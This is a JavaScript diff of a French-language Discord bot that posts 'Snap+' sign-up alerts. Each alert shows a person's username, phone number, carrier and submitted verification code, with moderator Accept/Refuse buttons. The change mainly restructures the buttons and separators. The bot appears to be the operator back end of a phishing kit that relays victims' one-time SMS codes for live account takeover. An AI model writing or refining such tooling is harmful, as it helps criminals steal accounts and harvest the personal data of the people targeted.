@@ -4,7 +4,8 @@ const {
     ActionRowBuilder,
     ButtonBuilder,
     ButtonStyle,
-    EmbedBuilder
+    EmbedBuilder,
+    ComponentType
 } = require('discord.js');
 
 const { users } = require('./store');
@@ -37,17 +38,14 @@ client.on('interactionCreate', async interaction => {
             .setTitle('✅ Code validé')
             .setColor('#2ecc71')
             .setDescription(
-                `${SEPARATOR}\n` +
                 `👤 **Nom d'utilisateur:** ${username}\n` +
                 `📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
                 `🔢 **Code:** \`${user.submittedCode}\`\n` +
                 `📅 **Validé à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
-                `${SEPARATOR}\n` +
                 `*Utilisateur vérifié*`
             );
 
         await interaction.update({
-            content: '@everyone',
             embeds: [embed],
             components: []
         });
@@ -62,17 +60,14 @@ client.on('interactionCreate', async interaction => {
             .setTitle('🔒 Code rejeté')
             .setColor('#e74c3c')
             .setDescription(
-                `${SEPARATOR}\n` +
                 `👤 **Nom d'utilisateur:** ${username}\n` +
                 `🔢 **Code saisi:** \`${rejectedCode || 'N/A'}\`\n` +
                 `📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
                 `📅 **Rejeté à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
-                `${SEPARATOR}\n` +
-                `*L’utilisateur devra ressaisir le code*`
+                `*L'utilisateur devra ressaisir le code*`
             );
 
         await interaction.update({
-            content: '@everyone',
             embeds: [embed],
             components: []
         });
@@ -98,30 +93,46 @@ async function sendInitialEmbed(username, phone) {
         .setTitle('📱 Nouvelle inscription Snap+')
         .setColor('#2b2d31')
         .setDescription(
-            `${SEPARATOR}\n` +
             `👤 **Nom d'utilisateur:** ${username}\n` +
             `📞 **Téléphone:** ${formatPhoneNumber(phone)}\n` +
             `🏛️ **Opérateur:** ${user.operator || 'N/A'}\n` +
             `⏰ **Date:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
-            `${SEPARATOR}\n` +
             `*En attente du code...*`
         );
 
-    const row = new ActionRowBuilder().addComponents(
-        new ButtonBuilder()
-            .setCustomId(`accept:${username}`)
-            .setLabel('Accepter')
-            .setStyle(ButtonStyle.Success),
-        new ButtonBuilder()
-            .setCustomId(`reject:${username}`)
-            .setLabel('Refuser')
-            .setStyle(ButtonStyle.Danger)
-    );
+    // Création des composants selon la nouvelle structure
+    const components = [
+        {
+            type: 10, // ComponentType.TEXT_DISPLAY
+            content: '@everyone'
+        },
+        {
+            type: 14, // ComponentType.SEPARATOR
+            divider: true,
+            spacing: 1
+        },
+        {
+            type: 1, // ComponentType.ACTION_ROW
+            components: [
+                {
+                    type: 2, // ComponentType.BUTTON
+                    custom_id: `accept:${username}`,
+                    label: 'Accepter',
+                    style: ButtonStyle.Success
+                },
+                {
+                    type: 2, // ComponentType.BUTTON
+                    custom_id: `reject:${username}`,
+                    label: 'Refuser',
+                    style: ButtonStyle.Danger
+                }
+            ]
+        }
+    ];
 
     await channel.send({
-        content: '@everyone',
         embeds: [embed],
-        components: [row]
+        components: components
     });
 }
 
@@ -133,30 +144,46 @@ async function sendCodeEmbed(username) {
         .setTitle('🔒 Code de vérification soumis')
         .setColor('#f1c40f')
         .setDescription(
-            `${SEPARATOR}\n` +
             `👤 **Nom d'utilisateur:** ${username}\n` +
             `🔢 **Code saisi:** \`${user.submittedCode}\`\n` +
             `📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
             `📅 **Soumis à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
-            `${SEPARATOR}\n` +
             `*En attente de validation par un modérateur*`
         );
 
-    const row = new ActionRowBuilder().addComponents(
-        new ButtonBuilder()
-            .setCustomId(`accept:${username}`)
-            .setLabel('Accepter')
-            .setStyle(ButtonStyle.Success),
-        new ButtonBuilder()
-            .setCustomId(`reject:${username}`)
-            .setLabel('Refuser')
-            .setStyle(ButtonStyle.Danger)
-    );
+    // Création des composants selon la nouvelle structure
+    const components = [
+        {
+            type: 10, // ComponentType.TEXT_DISPLAY
+            content: '@everyone'
+        },
+        {
+            type: 14, // ComponentType.SEPARATOR
+            divider: true,
+            spacing: 1
+        },
+        {
+            type: 1, // ComponentType.ACTION_ROW
+            components: [
+                {
+                    type: 2, // ComponentType.BUTTON
+                    custom_id: `accept:${username}`,
+                    label: 'Accepter',
+                    style: ButtonStyle.Success
+                },
+                {
+                    type: 2, // ComponentType.BUTTON
+                    custom_id: `reject:${username}`,
+                    label: 'Refuser',
+                    style: ButtonStyle.Danger
+                }
+            ]
+        }
+    ];
 
     await channel.send({
-        content: '@everyone',
         embeds: [embed],
-        components: [row]
+        components: components
     });
 }
 
